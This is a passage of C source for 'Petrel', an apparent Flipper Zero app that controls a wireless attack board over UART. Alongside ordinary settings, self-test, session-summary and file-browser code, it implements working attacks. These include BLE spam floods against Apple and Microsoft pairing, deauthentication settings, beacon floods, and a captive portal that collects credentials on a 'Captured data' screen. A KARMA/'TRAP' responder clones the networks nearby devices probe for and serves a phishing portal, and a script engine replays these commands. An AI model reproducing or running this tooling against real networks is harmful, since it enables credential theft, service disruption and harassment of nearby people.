// scene_manager_handle_custom_event(), which the hub IGNORES - wifi_hub_scene_on_event() returns
// false for every event - and that is why the first run sat on the hub scene for all 29 steps. Each
// step is breadcrumbed with diag() together with the ACTUAL current scene, so a crash or a stuck
// step leaves the exact place - and it needs no external RPC at all, which is what makes the
// "app alone" measurement possible.
#define ST_LAPS 3
#define ST_STEPS 10
static uint8_t st_lap = 0;
static uint8_t st_step = 0;
static uint32_t st_due = 0;
static volatile bool st_active = false;

static void selftest_step(Petrel* app) {
    // Let the production scan completion path return before taking another action. If it never
    // does (board silent, link dead), abort the self-test instead of freezing the app: the old
    // unconditional return left the UI unresponsive with no way back.
    if(app->scan_waiting) {
        static uint32_t wait_since = 0;
        uint32_t nowt = furi_get_tick();
        if(!wait_since) wait_since = nowt;
        if((int32_t)(nowt - wait_since) > (int32_t)furi_ms_to_ticks(20000)) {
            wait_since = 0;
            app->scan_waiting = false;
            st_active = false;
            diag(19, 99u, 1u);   // self-test failure: scan completion never arrived
            view_dispatcher_stop(app->view_dispatcher);
        }
        return;
    }
    (void)0;

    // Finish on a later tick, after any scan started by the final step has completed.
    if(st_lap >= ST_LAPS) {
        st_active = false;
        diag(9, (uint32_t)st_lap, diag_dropped);
        view_dispatcher_stop(app->view_dispatcher);
        return;
    }

    uint32_t scene = scene_manager_get_current_scene(app->scene_manager);
    bool root_below = scene_manager_has_previous_scene(app->scene_manager, mainMenuScene);

    // A non-root scene must retain the root below it. A root must not be duplicated.
    if((scene == mainMenuScene && root_below) || (scene != mainMenuScene && !root_below)) {
        st_active = false;
        diag(19, scene, 1u);   // self-test failure: root invariant
        view_dispatcher_stop(app->view_dispatcher);
        return;
    }

    diag(8, (uint32_t)st_step, (uint32_t)st_lap);
    diag(10, scene, root_below ? 1u : 0u);   // actual scene BEFORE action

    switch(scene) {
    case mainMenuScene:
        scene_manager_next_scene(app->scene_manager, wifiHubScene);
        break;
    case wifiHubScene:
        // Production submenu callback IDs, not the custom-event enum.
        // 2026-10-29: do NOT start a scan here. Driving the scan scene from this tick wedged the
        // GUI thread (scan_waiting then blocked the very step that would have popped the scene,
        // and the app stopped answering keys). The scan is covered by the manual flow; the
        // self-test now walks List Wifi / Channel Map instead.
        wifi_hub_cb(app, (st_lap & 1) == 0 ? 1u : 2u);
        break;
    default:
        // root_below was checked BEFORE attempting the pop.
        if(!scene_manager_previous_scene(app->scene_manager)) {
            st_active = false;
            diag(19, scene, 2u);   // self-test failure: unexpected empty stack
            view_dispatcher_stop(app->view_dispatcher);
            return;
        }
        break;
    }

    st_step++;
    if(st_step >= ST_STEPS) {
        st_step = 0;
        st_lap++;
    }
}

static void settings_channel_cb(VariableItem* item) {
    set_channel_idx = variable_item_get_current_value_index(item);
    variable_item_set_current_value_text(item, set_channels[set_channel_idx]);
    petrel_settings_save();
}
static void settings_wait_cb(VariableItem* item) {
    set_scan_wait = variable_item_get_current_value_index(item) + 5;
    char b[8];
    snprintf(b, sizeof(b), "%ds", set_scan_wait);
    variable_item_set_current_value_text(item, b);
    petrel_settings_save();
}
static void settings_vibro_cb(VariableItem* item) {
    set_vibro = variable_item_get_current_value_index(item) != 0;
    variable_item_set_current_value_text(item, set_vibro ? "on" : "off");
    petrel_settings_save();
}
static void settings_selftest_cb(VariableItem* item) {
    st_active = variable_item_get_current_value_index(item) != 0;
    st_lap = 0;
    st_step = 0;
    st_due = furi_get_tick();
    diag(7, st_active ? 1u : 0u, (uint32_t)ST_LAPS);
}
static void settings_save_cb(VariableItem* item) {
    set_save = variable_item_get_current_value_index(item) != 0;
    variable_item_set_current_value_text(item, set_save ? "on" : "off");
    petrel_settings_save();
}

void settings_scene_on_enter(void* context) {
    Petrel* app = context;
    VariableItem* item;
    variable_item_list_reset(app->variableList);
    // reset() frees the items but leaves model->position/window_position untouched, so a position
    // left over from a longer list survives. The enter callback is handed model->position, and
    // get_selected_item() walks position steps into the (now shorter) array without a bounds guard
    // and returns a pointer past the end - pressing OK then dereferences it. Pin the selection to 0.
    variable_item_list_set_selected_item(app->variableList, 0);
    // FIRST row on purpose: it must be reachable in one key press. Every settings callback reads its
    // own item's index (none assumes a fixed row), so the order is free - and being last meant a test
    // run could not reliably reach it, which is how the self-test kept never starting.
    item = variable_item_list_add(app->variableList, "Self-test", 2, settings_selftest_cb, app);
    variable_item_set_current_value_index(item, st_active ? 1 : 0);
    variable_item_set_current_value_text(item, st_active ? "on" : "off");

    item = variable_item_list_add(
        app->variableList, "Def. channel", SET_CHANNELS_N, settings_channel_cb, app);
    variable_item_set_current_value_index(item, set_channel_idx);
    variable_item_set_current_value_text(item, set_channels[set_channel_idx]);

    item = variable_item_list_add(app->variableList, "Scan wait", 26, settings_wait_cb, app);
    variable_item_set_current_value_index(item, set_scan_wait - 5);
    {
        char b[8];
        snprintf(b, sizeof(b), "%ds", set_scan_wait);
        variable_item_set_current_value_text(item, b);
    }

    item = variable_item_list_add(app->variableList, "Vibration", 2, settings_vibro_cb, app);
    variable_item_set_current_value_index(item, set_vibro ? 1 : 0);
    variable_item_set_current_value_text(item, set_vibro ? "on" : "off");

    item = variable_item_list_add(app->variableList, "Save results", 2, settings_save_cb, app);
    variable_item_set_current_value_index(item, set_save ? 1 : 0);
    variable_item_set_current_value_text(item, set_save ? "on" : "off");


    view_dispatcher_switch_to_view(app->view_dispatcher, settingsView);
}
bool settings_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}
void settings_scene_on_exit(void* context) {
    UNUSED(context);
}

// E8: session summary — how much this app run found, plus a session.txt snapshot.
void session_scene_on_enter(void* context) {
    Petrel* app = context;
    widget_reset(app->widget);
    widget_add_string_element(
        app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "Session summary");

    // D6-4 (architect): the existing drop counters, visible at last. These are SNAPSHOTS of
    // counters with their existing limitations - zero does not prove complete evidence. Deliberately
    // no diagnostic record or popup per drop: that would amplify the very overload it reports.
    const uint32_t dd = diag_dropped;
    const uint32_t sd = storage_dropped;

    char buf[384];
    snprintf(
        buf,
        sizeof(buf),
        "id %s\nDiag lost %lu\nSave jobs lost %lu\n"
        "APs %d\nSTA %d\nPMF %d\nProbe devs %d\nDeauths %d\nCreds %d\n"
        "fw %.24s caps %.64s\n/ext/petrel/sessions/%s/\n",
        petrel_session_id,
        (unsigned long)dd,
        (unsigned long)sd,
        sess_wifis,
        sess_stas,
        sess_pmf,
        sess_probes,
        sess_deauth,
        sess_creds,
        app->fw_version[0] ? app->fw_version : "-",
        app->fw_caps[0] ? app->fw_caps : "-",
        petrel_session_id);
    widget_add_text_scroll_element(app->widget, 0, 14, 128, 50, buf);

    char body[384];
    snprintf(
        body,
        sizeof(body),
        "DiagDropped=%lu\nStorageQueueDropped=%lu\n"
        "APs=%d\nSTA=%d\nPMF=%d\nProbeDevices=%d\nCreds=%d\n"
        "fw=%.24s caps=%.64s\n",
        (unsigned long)dd,
        (unsigned long)sd,
        sess_wifis,
        sess_stas,
        sess_pmf,
        sess_probes,
        sess_creds,
        app->fw_version[0] ? app->fw_version : "-",
        app->fw_caps[0] ? app->fw_caps : "-");
    petrel_save_scan("session", body);
    view_dispatcher_switch_to_view(app->view_dispatcher, pmfView);
}
bool session_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}
void session_scene_on_exit(void* context) {
    UNUSED(context);
}

// D1: pick a scanned BLE device and enumerate its GATT services/characteristics.
static void gatt_item_cb(void* context, uint32_t index) {
    Petrel* app = context;
    if((int)index >= ble_list_n) return;
    recon_text[0] = '\0';
    snprintf(recon_title, sizeof(recon_title), "GATT");
    char cmd[48];
    snprintf(cmd, sizeof(cmd), "BLEGATTPROBE %s 1\n", ble_list_mac[index]);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    petrel_busy_ex(app, "GATT", "Connecting...", 15);
}
void gatt_scene_on_enter(void* context) {
    Petrel* app = context;
    app->submenuIndex = 0;
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "GATT enumerate");
    if(ble_list_n == 0) {
        submenu_add_item(app->submenu, "Run BLE Scan first", 0, NULL, app);
    } else {
        for(int i = 0; i < ble_list_n; i++) {
            char label[44];
            snprintf(label, sizeof(label), "..%s %.12s", ble_list_mac[i] + 9, ble_list_name[i]);
            submenu_add_item(app->submenu, label, i, gatt_item_cb, app);
        }
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, toolsListView);
}
bool gatt_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}
void gatt_scene_on_exit(void* context) {
    UNUSED(context);
}

// D2: pick a BLE spam payload family (Apple continuity / Microsoft Swift Pair).
static void blespam_item_cb(void* context, uint32_t index) {
    Petrel* app = context;
    char cmd[32];
    snprintf(cmd, sizeof(cmd), "BLESPAM %u 30\n", (unsigned)index);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    petrel_busy_ex(app, "BLE spam", "Blasting 30s...", 30);
}
void blespam_scene_on_enter(void* context) {
    Petrel* app = context;
    app->submenuIndex = 0;
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "BLE spam");
    submenu_add_item(app->submenu, "Apple Pair (Pods/Tag)", 0, blespam_item_cb, app);
    submenu_add_item(app->submenu, "Apple Action (iPhone/TV)", 1, blespam_item_cb, app);
    submenu_add_item(app->submenu, "Apple AirDrop", 2, blespam_item_cb, app);
    submenu_add_item(app->submenu, "Microsoft Swift Pair", 3, blespam_item_cb, app);
    submenu_add_item(app->submenu, "All (rotate)", 4, blespam_item_cb, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, toolsListView);
}
bool blespam_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}
void blespam_scene_on_exit(void* context) {
    UNUSED(context);
}

// A3/D4: flag the scanned devices that look like location trackers.
void tracker_scene_on_enter(void* context) {
    Petrel* app = context;
    widget_reset(app->widget);
    widget_add_string_element(
        app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "Tracker scan");
    char buf[512];
    int n = snprintf(buf, sizeof(buf), "* = possible tracker\n");
    int found = 0;
    for(int i = 0; i < ble_list_n && n < (int)sizeof(buf) - 40; i++) {
        bool tr = ble_is_tracker(ble_list_tag[i]);
        if(tr) found++;
        n += snprintf(
            buf + n,
            sizeof(buf) - n,
            "%s%s %s\n",
            tr ? "*" : " ",
            ble_list_tag[i][0] ? ble_list_tag[i] : "?",
            ble_list_mac[i]);
    }
    if(ble_list_n == 0) n += snprintf(buf + n, sizeof(buf) - n, "(run BLE Scan first)\n");
    snprintf(
        buf + (n < (int)sizeof(buf) - 1 ? n : (int)sizeof(buf) - 1),
        sizeof(buf) - (n < (int)sizeof(buf) - 1 ? n : (int)sizeof(buf) - 1),
        "\n%d/%d flagged",
        found,
        ble_list_n);
    widget_add_text_scroll_element(app->widget, 0, 14, 128, 50, buf);
    petrel_save_scan("trackers", buf);
    view_dispatcher_switch_to_view(app->view_dispatcher, pmfView);
}
bool tracker_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}
void tracker_scene_on_exit(void* context) {
    UNUSED(context);
}

// --- E7: on-device browser for the saved sessions --------------------------------
#define BROWSE_MAX 24
static char browse_names[BROWSE_MAX][40];
static int browse_n = 0;
static int browse_level = 0; // 0 = sessions, 1 = files inside the selected session
static char browse_dir[64] = "";

static void browse_read_dir(const char* dir, bool want_dirs) {
    Storage* st = furi_record_open(RECORD_STORAGE);
    browse_n = 0;
    File* d = storage_file_alloc(st);
    if(storage_dir_open(d, dir)) {
        FileInfo fi;
        char nm[64];
        while(browse_n < BROWSE_MAX && storage_dir_read(d, &fi, nm, sizeof(nm))) {
            if(file_info_is_dir(&fi) != want_dirs) continue;
            strncpy(browse_names[browse_n], nm, sizeof(browse_names[0]) - 1);
            browse_names[browse_n][sizeof(browse_names[0]) - 1] = '\0';
            browse_n++;
        }
        storage_dir_close(d);
    }
    storage_file_free(d);
    furi_record_close(RECORD_STORAGE);
}

static void browse_item_cb(void* context, uint32_t index);

static void browse_fill(Petrel* app) {
    app->submenuIndex = 0;
    submenu_reset(app->submenu);
    if(browse_level == 0) {
        submenu_set_header(app->submenu, "Sessions");
        browse_read_dir("/ext/petrel/sessions", true);
    } else {
        submenu_set_header(app->submenu, "Files");
        browse_read_dir(browse_dir, false);
    }
    if(browse_n == 0) {
        submenu_add_item(app->submenu, "(empty)", 0, NULL, app);
    } else {
        for(int i = 0; i < browse_n; i++)
            submenu_add_item(app->submenu, browse_names[i], i, browse_item_cb, app);
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, toolsListView);
}

static void browse_item_cb(void* context, uint32_t index) {
    Petrel* app = context;
    if((int)index >= browse_n) return;
    if(browse_level == 0) {
        snprintf(browse_dir, sizeof(browse_dir), "/ext/petrel/sessions/%s", browse_names[index]);
        browse_level = 1;
        browse_fill(app);
        return;
    }
    // level 1: read the file (up to ~1 KB) and show it in the recon view
    char path[128];
    snprintf(path, sizeof(path), "%s/%s", browse_dir, browse_names[index]);
    Storage* st = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(st);
    recon_text[0] = '\0';
    if(storage_file_open(f, path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        uint16_t n = storage_file_read(f, recon_text, sizeof(recon_text) - 1);
        recon_text[n] = '\0';
        storage_file_close(f);
    }
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
    snprintf(recon_title, sizeof(recon_title), "%.22s", browse_names[index]);
    scene_manager_next_scene(app->scene_manager, pmfScene);
}

void browse_scene_on_enter(void* context) {
    Petrel* app = context;
    if(browse_reset) {
        browse_level = 0;
        browse_reset = false;
    }
    browse_fill(app);
}
bool browse_scene_on_event(void* context, SceneManagerEvent event) {
    Petrel* app = context;
    if(event.type == SceneManagerEventTypeBack && browse_level == 1) {
        browse_level = 0; // back from the file list -> the session list
        browse_fill(app);
        return true;
    }
    return false;
}
void browse_scene_on_exit(void* context) {
    UNUSED(context);
}

void config_attack_scene_on_enter(void* context) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    VariableItem* item;
    variable_item_list_reset(app->variableList);
    // reset() frees the items but leaves model->position/window_position untouched, so a position
    // left over from a longer list survives. The enter callback is handed model->position, and
    // get_selected_item() walks position steps into the (now shorter) array without a bounds guard
    // and returns a pointer past the end - pressing OK then dereferences it. Pin the selection to 0.
    variable_item_list_set_selected_item(app->variableList, 0);
    item = variable_item_list_add(
        app->variableList, "Reason", 25, deauth_reason_change_call_back, app);
    variable_item_set_current_value_index(item, app->deauthReason);
    variable_item_set_current_value_text(item, deauth_reason_short[app->deauthReason]);
    item = variable_item_list_add(
        app->variableList, "Portal Type", CAPTIVE_PORTAL_SIZE, portal_type_change_call_back, app);
    variable_item_set_current_value_index(item, app->captivePortal);
    variable_item_set_current_value_text(item, captive_portals[app->captivePortal]);

    item =
        variable_item_list_add(app->variableList, "Mac Type", 4, mac_type_change_call_back, app);
    variable_item_set_current_value_index(item, app->mac_type);
    variable_item_set_current_value_text(item, mac_type[app->mac_type]);
    // One action row (index 3) opens the Tools submenu; the optional custom-MAC row
    // stays at index 4 so config_attack_change_call_back's dispatch is stable.
    variable_item_list_add(app->variableList, "Tools (capture / recon)", 0, NULL, NULL);
    view_dispatcher_switch_to_view(app->view_dispatcher, configAttackView);

    if(app->mac_type == 2) {
        item = variable_item_list_add(app->variableList, app->customMac, 0, NULL, NULL);
    }
    variable_item_list_set_enter_callback(app->variableList, config_attack_change_call_back, app);
}
bool config_attack_scene_on_event(void* context, SceneManagerEvent event) {
    Petrel* app = context;
    if(event.type == SceneManagerEventTypeCustom && event.event == PETREL_EVT_REBUILD_VIL) {
        // Same deferred rebuild as config_ap_scene_on_event: mac_type_change_call_back posts this
        // instead of calling config_attack_scene_on_enter() while its own list is dispatching.
        config_attack_scene_on_enter(app);
        return true;
    }
    return false;
}
void config_attack_scene_on_exit(void* context) {
    //Petrel* app = context;
    //uart_helper_send(app->uart_helper, "STOP\n", 5);

    UNUSED(context);
}

static bool creds_scene_shown = false;  // are we currently on the Captured-data scene?

void evil_creds_scene_on_enter(void* context) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    creds_scene_shown = true;
    widget_reset(app->widget);
    widget_add_string_multiline_element(
        app->widget, 64, 4, AlignCenter, AlignTop, FontSecondary, "Captured data");
    widget_add_text_scroll_element(app->widget, 0, 16, 128, 50, credentials);

    view_dispatcher_switch_to_view(app->view_dispatcher, evilCredsView);
    UNUSED(context);
}

bool evil_creds_scene_on_event(void* context, SceneManagerEvent event) {
    FURI_LOG_D(TAG, __func__);
    UNUSED(context);
    UNUSED(event);
    return false;
}

void evil_creds_scene_on_exit(void* context) {
    FURI_LOG_D(TAG, __func__);
    // Do NOT send STOP here. Leaving the "Captured data" screen must NOT tear the AP
    // down -- that was killing the portal right after the first submit (every captured
    // credential re-entered this scene -> on_exit -> STOP). Stop the AP explicitly via
    // Tools -> "Stop / clear".
    creds_scene_shown = false;
    UNUSED(context);
}

void mac_key_input_byte_input_callback(void* context) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    snprintf(
        app->customMac,
        18,
        "%02X:%02X:%02X:%02X:%02X:%02X",
        app->byte_input_store[0],
        app->byte_input_store[1],
        app->byte_input_store[2],
        app->byte_input_store[3],
        app->byte_input_store[4],
        app->byte_input_store[5]);
    FURI_LOG_D(TAG, "%s", app->customMac);

    scene_manager_previous_scene(app->scene_manager);
    UNUSED(context);
}
void custom_ap_mac_scene_on_enter(void* context) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    ByteInput* byte_input = app->byteInput;

    byte_input_set_header_text(app->byteInput, "Set the AP MAC");
    byte_input_set_result_callback(
        byte_input, mac_key_input_byte_input_callback, NULL, app, app->byte_input_store, MAC_LENGH);

    view_dispatcher_switch_to_view(app->view_dispatcher, aPmacAddresView);

    UNUSED(context);
}

bool custom_ap_mac_scene_on_event(void* context, SceneManagerEvent event) {
    FURI_LOG_D(TAG, __func__);

    UNUSED(context);
    UNUSED(event);
    return false;
}

void custom_ap_mac_scene_on_exit(void* context) {
    FURI_LOG_D(TAG, __func__);
    UNUSED(context);
}

void custom_beacon_scene_on_enter(void* context) {
    Petrel* app = context;
    text_input_reset(app->text_input);
    text_input_set_header_text(app->text_input, "Acces Point Name");
    text_input_set_result_callback(
        app->text_input,
        beacon_networks_text_input_callback,
        app,
        app->ssidAP,
        app->ssidAPLength,
        true);

    view_dispatcher_switch_to_view(app->view_dispatcher, bssidTextInputView);

    UNUSED(context);
}

bool custom_beacon_scene_on_event(void* context, SceneManagerEvent event) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;

    FURI_LOG_I("Petrel", "%s event.type: %d", __func__, event.type);
    FURI_LOG_I("Petrel", "%s event.event: %ld", __func__, event.event);
    char cadena[40];
    switch(event.type) {
    case SceneManagerEventTypeCustom:
        switch(event.event) {
        case SsidAPInputSceneSaveEvent:
            FURI_LOG_D(TAG, "ssidAPLenght %d", strlen(app->ssidAP));

            snprintf(cadena, sizeof(cadena), "BSSID %s\n", app->ssidAP); // bound by buffer, not SSID len (M1)
            uart_helper_send(app->uart_helper, cadena, strlen(cadena));
            FURI_LOG_D(TAG, "%s", cadena);
            scene_manager_next_scene(app->scene_manager, beaconInfoScene);
            break;
        }
        return true;
    default:
        break;
    }
    return false;
}

void custom_beacon_scene_on_exit(void* context) {
    UNUSED(context);
}

void beacon_info_scene_on_enter(void* context) {
    Petrel* app = context;
    widget_reset(app->widget);

    switch(app->submenuIndex) {
    case 0:
        widget_add_string_element(
            app->widget, 64, 10, AlignCenter, AlignTop, FontPrimary, app->ssidAP);
        break;
    case 1:
        widget_add_string_element(
            app->widget, 64, 10, AlignCenter, AlignTop, FontPrimary, "Random");
        break;
    case 2:
        widget_add_string_element(
            app->widget, 90, 10, AlignCenter, AlignTop, FontPrimary, "RickRoll");
        widget_add_icon_element(app->widget, 0, 0, rick[0]);
        furi_timer_start(app->timer, 300);
        break;
    case 3:
        widget_add_string_element(
            app->widget, 80, 10, AlignCenter, AlignTop, FontPrimary, "Ghost AP");
        break;
    }
    // These modes flood beacons for as long as this screen is up; say so, and say how to stop.
    widget_add_string_multiline_element(
        app->widget,
        64,
        30,
        AlignCenter,
        AlignTop,
        FontSecondary,
        "Beacon flood active\nBACK to stop");
    view_dispatcher_switch_to_view(app->view_dispatcher, beaconInfoView);
}

bool beacon_info_scene_on_event(void* context, SceneManagerEvent event) {
    Petrel* app = context;
    if(event.type == SceneManagerEventTypeCustom && event.event == PETREL_EVT_ANIM_TICK) {
        // RickRoll frame, moved here from animation_timer_callback (timer thread -> GUI thread).
        // Reached only while this is the current scene, so the timer's old "did anyone navigate
        // away?" problem is gone by construction.
        if(app->rickIndex % 4 == 0) {
            widget_reset(app->widget);
            widget_add_string_element(
                app->widget, 90, 10, AlignCenter, AlignTop, FontPrimary, "RickRoll");
            if(app->rickIndex >= 8) {
                widget_add_string_multiline_element(
                    app->widget,
                    128,
                    30,
                    AlignRight,
                    AlignCenter,
                    FontSecondary,
                    "Never gonna\ngive you up");
            }
            if(app->rickIndex >= 16) {
                widget_add_string_multiline_element(
                    app->widget,
                    64,
                    53,
                    AlignLeft,
                    AlignCenter,
                    FontSecondary,
                    "Never gonna\nlet you down");
            }
        }
        app->rickIndex = (app->rickIndex + 1) % 24;
        widget_add_icon_element(app->widget, 0, 0, rick[app->rickIndex]);
        return true;
    }
    return false;
}

void beacon_info_scene_on_exit(void* context) {
    UNUSED(context);
    Petrel* app = context;
    furi_timer_stop(app->timer);
    // STOP only cleared ghostSpam; random/rickroll/custom floods kept running after leaving
    // this screen. BEACONOFF clears every beacon mode.
    uart_helper_send(app->uart_helper, "BEACONOFF\n", 10);
}

// --- B1: KARMA / known-beacon responder scene ----------------------------------
// The board sniffs probe requests and answers each requested SSID with a fake AP of the same name.
// This screen turns it on and polls KARMALIST so the caught SSIDs show up live; leaving it turns
// the responder off (so it never runs unattended).
// NOTE: this uses its own timer. busyTimer must not be reused: its callback only commits the busy
// model directly and never posts PETREL_EVT_BUSY_TICK, so a tick-based poll there would never run.
static void karma_timer_cb(void* context) {
    Petrel* app = context;
    // Poll from the timer thread via a custom event; the scene then sends KARMALIST.
    post_event(app, PETREL_EVT_KARMA_POLL);
}

// F1: same pattern - the tick only posts an event, the scene does the work on the GUI thread.
static void script_timer_cb(void* context) {
    Petrel* app = context;
    post_event(app, PETREL_EVT_SCRIPT_TICK);
}

static void karma_button_cb(GuiButtonType result, InputType type, void* context);

static void karma_render(Petrel* app) {
    widget_reset(app->widget);
    char title[24];
    snprintf(title, sizeof(title), "%s ch%d", karma_trap ? "TRAP" : "KARMA", karma_chan_sel);
    widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, title);
    int n = karma_list[0] ? atoi(karma_list) : 0;
    char hdr[48];
    if(karma_trap) {
        // C1: which portal the cloned AP will serve - cycled with LEFT/RIGHT on this screen.
        snprintf(hdr, sizeof(hdr), "Portal: %.14s", captive_portals[app->captivePortal]);
        widget_add_string_element(app->widget, 64, 13, AlignCenter, AlignTop, FontSecondary, hdr);
    }
    snprintf(hdr, sizeof(hdr), "%d SSID%s answered", n, n == 1 ? "" : "s");
    widget_add_string_element(
        app->widget, 64, karma_trap ? 22 : 14, AlignCenter, AlignTop, FontSecondary, hdr);
    int y = karma_trap ? 31 : 24;
    if(karma_trap && trap_state[0]) {
        char ap[40];
        snprintf(ap, sizeof(ap), "AP: %.24s", trap_state);
        widget_add_string_element(app->widget, 64, y, AlignCenter, AlignTop, FontSecondary, ap);
        y += 9;
    }
    char body[192];
    int o = 0;
    const char* q = strchr(karma_list, '|');
    while(q && o < 110) {
        const char* e = strchr(q + 1, '|');
        int l = e ? (int)(e - q - 1) : (int)strlen(q + 1);
        if(l > 0) o += snprintf(body + o, sizeof(body) - (size_t)o, "%.*s\n", l, q + 1);
        q = e;
    }
    if(o > 0) {
        widget_add_string_multiline_element(app->widget, 64, y, AlignCenter, AlignTop, FontSecondary, body);
    } else if(!(karma_trap && trap_state[0])) {
        widget_add_string_element(
            app->widget, 64, y + 2, AlignCenter, AlignTop, FontSecondary, "waiting for probes");
    }
    widget_add_string_element(
        app->widget,
        64,
        54,
        AlignCenter,
        AlignTop,
        FontSecondary,
        karma_trap ? "ch+ / portal - +" : "centre: channel");
    if(karma_trap) {
        widget_add_button_element(app->widget, GuiButtonTypeLeft, "Port-", karma_button_cb, app);
        widget_add_button_element(app->widget, GuiButtonTypeCenter, "Ch+", karma_button_cb, app);
        widget_add_button_element(app->widget, GuiButtonTypeRight, "Port+", karma_button_cb, app);
    } else {
        widget_add_button_element(app->widget, GuiButtonTypeCenter, "Ch+", karma_button_cb, app);
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, beaconInfoView);
}

// C1: controls for the KARMA/Trap screen, as widget buttons on purpose. Hijacking the widget
// view's input callback (an earlier attempt) replaces the widget's own button handling for every
// screen sharing that view - it broke the AP info screen's Edit button, which is the only way
// into the Tools menu. Buttons keep the widget in charge.
static void karma_button_cb(GuiButtonType result, InputType type, void* context) {
    Petrel* app = context;
    if(type != InputTypeShort || !karma_active) return;
    if(karma_trap && (result == GuiButtonTypeLeft || result == GuiButtonTypeRight)) {
        int i = app->captivePortal;
        i = (result == GuiButtonTypeRight) ? (i + 1) : (i - 1 + CAPTIVE_PORTAL_SIZE);
        app->captivePortal = i % CAPTIVE_PORTAL_SIZE;
        petrel_send_portal_sel(app);
    } else {
        // channel (both modes): changing it re-arms the responder, so a clone that was up is gone
        karma_chan_sel++;
        if(karma_chan_sel > 13) karma_chan_sel = 1;
        trap_state[0] = '\0';
        char cmd[32];
        snprintf(cmd, sizeof(cmd), karma_trap ? "TRAP 1 %d\n" : "KARMA 1 %d\n", karma_chan_sel);
        uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    }
    post_event(app, PETREL_EVT_KARMA);
}

void karma_scene_on_enter(void* context) {
    Petrel* app = context;
    karma_list[0] = '\0';
    karma_saved[0] = '\0';
    trap_state[0] = '\0';
    if(karma_chan_sel < 1 || karma_chan_sel > 13) karma_chan_sel = petrel_def_ch();
    char cmd[32];
    snprintf(cmd, sizeof(cmd), karma_trap ? "TRAP 1 %d\n" : "KARMA 1 %d\n", karma_chan_sel);
    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
    if(karma_trap) {
        // Make sure the board holds the chosen portal before any clone starts.
        petrel_send_portal_sel(app);
    }
    karma_active = true;
    karma_render(app);
    uart_helper_send(app->uart_helper, "KARMALIST\n", 10);
    furi_timer_start(app->karmaTimer, 1500);
}

bool karma_scene_on_event(void* context, SceneManagerEvent event) {
    Petrel* app = context;
    if(event.type == SceneManagerEventTypeCustom && event.event == PETREL_EVT_KARMA) {
        karma_render(app);
        return true;
    }
    if(event.type == SceneManagerEventTypeCustom && event.event == PETREL_EVT_KARMA_POLL) {
        uart_helper_send(app->uart_helper, "KARMALIST\n", 10);
        if(karma_trap) uart_helper_send(app->uart_helper, "TRAPSTAT\n", 9);
        return true;
    }
    return false;
}

void karma_scene_on_exit(void* context) {
    Petrel* app = context;
    karma_active = false;
    furi_timer_stop(app->karmaTimer);
    // Trap also owns the softAP, so TRAP 0 tears that down too.
    uart_helper_send(app->uart_helper, karma_trap ? "TRAP 0\n" : "KARMA 0\n", karma_trap ? 7 : 8);
}

// --- F1: SD script engine --------------------------------------------------------------
// /ext/petrel/scripts/*.txt holds one board command per line, "#" comments, and "WAIT <secs>".
// The app plays them back, so the firmware needs no interpreter at all - it just receives the
// same commands the menus send. While a script runs the reply popups are not pushed as scenes
// (see Petrel_custom_callback), otherwise they would cover the runner screen.
#define SCRIPT_DIR "/ext/petrel/scripts"
#define SCRIPT_FILES_MAX 8
#define SCRIPT_LINES_MAX 20
#define SCRIPT_LINE_LEN 64
static char script_names[SCRIPT_FILES_MAX][48];
static int script_file_count = 0;
static char script_name[48] = {0};
static char script_lines[SCRIPT_LINES_MAX][SCRIPT_LINE_LEN];
static int script_line_count = 0;
static int script_pc = 0;
static int script_wait = 0;
static bool script_running = false;
static char script_status[48] = {0};

static const char* SCRIPT_DEMO =
    "# petrel script - one board command per line, \"WAIT <secs>\" to pause, # = comment\n"
    "HELLO\n"
    "WAIT 1\n"
    "SCAN\n"
    "WAIT 8\n"
    "KARMA 1 6\n"
    "WAIT 6\n"
    "KARMALIST\n"
    "WAIT 2\n"
    "KARMA 0\n";

static void script_seed_demo(void) {
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, SCRIPT_DIR);
    File* f = storage_file_alloc(st);
    if(storage_file_open(f, SCRIPT_DIR "/demo.txt", FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        storage_file_write(f, SCRIPT_DEMO, strlen(SCRIPT_DEMO));
        storage_file_close(f);
    }
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
}

static void script_list_load(void) {
    script_file_count = 0;
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, SCRIPT_DIR);
    File* dir = storage_file_alloc(st);
    if(storage_dir_open(dir, SCRIPT_DIR)) {
        FileInfo fi;
        char name[64];
        while(storage_dir_read(dir, &fi, name, sizeof(name)) && script_file_count < SCRIPT_FILES_MAX) {
            if(file_info_is_dir(&fi)) continue;
            size_t l = strlen(name);
            if(l > 4 && strcmp(name + l - 4, ".txt") == 0) {
                strncpy(script_names[script_file_count], name, 47);
                script_names[script_file_count][47] = '\0';
                script_file_count++;
            }
        }
        storage_dir_close(dir);
    }
    storage_file_free(dir);
    furi_record_close(RECORD_STORAGE);
    if(script_file_count == 0) {
